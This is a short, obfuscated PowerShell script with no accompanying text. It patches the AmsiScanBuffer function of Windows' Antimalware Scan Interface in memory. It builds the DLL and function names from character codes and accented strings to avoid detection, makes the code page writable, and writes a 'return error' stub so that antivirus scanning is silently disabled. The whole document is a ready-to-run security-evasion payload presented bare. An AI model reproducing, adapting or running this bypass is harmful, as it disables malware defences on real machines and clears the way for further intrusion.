$B5lalKCdSnRIl = @"
using System;
using System.Runtime.InteropServices;
public class B5lalKCdSnRIl {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr QP_XstQS, string JvzibHMu);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr UbQtHCeD3p2nk, UIntPtr DPZAXkVg, uint gDJBkc, out uint NRyKwixzWvzraU3);
}
"@

Add-Type $B5lalKCdSnRIl

$l7M0p81t0kddE = [B5lalKCdSnRIl]::LoadLibrary("$([chAR]([Byte]0x61)+[cHAR]([bYtE]0x6d)+[cHAr](115)+[CHaR]([BYte]0x69)+[CHAr]([bYte]0x2e)+[chaR]([bYtE]0x64)+[ChaR]([byTe]0x6c)+[ChAr](64+44))")
$IU7eqIYVwtbRa6N6j = [B5lalKCdSnRIl]::GetProcAddress($l7M0p81t0kddE, "$(('ÄmsìScàn'+'Búffèr').nOrmaLize([cHaR]([BYte]0x46)+[ChAr]([BytE]0x6f)+[chAR](65+49)+[ChAr](25+84)+[cHAR](68*43/43)) -replace [CHar](92+65-65)+[chAR]([bytE]0x70)+[chAr](123*75/75)+[chAR]([BYte]0x4d)+[cHAR](110*62/62)+[CHAr](125*120/120))")
$p = 0
[B5lalKCdSnRIl]::VirtualProtect($IU7eqIYVwtbRa6N6j, [uint32]5, 0x40, [ref]$p)
$JwmBbC = "0xB8"
$rDEarERLtbibdJ = "0x57"
$dVTVRHSn2pDQrt1w0a = "0x00"
$C8anLRFZI_ = "0x07"
$bxZ = "0x80"
$rzN9o = "0xC3"
$g0w9IK8jkdG = [Byte[]] ($JwmBbC,$rDEarERLtbibdJ,$dVTVRHSn2pDQrt1w0a,$C8anLRFZI_,+$bxZ,+$rzN9o)
[System.Runtime.InteropServices.Marshal]::Copy($g0w9IK8jkdG, 0, $IU7eqIYVwtbRa6N6j, 6)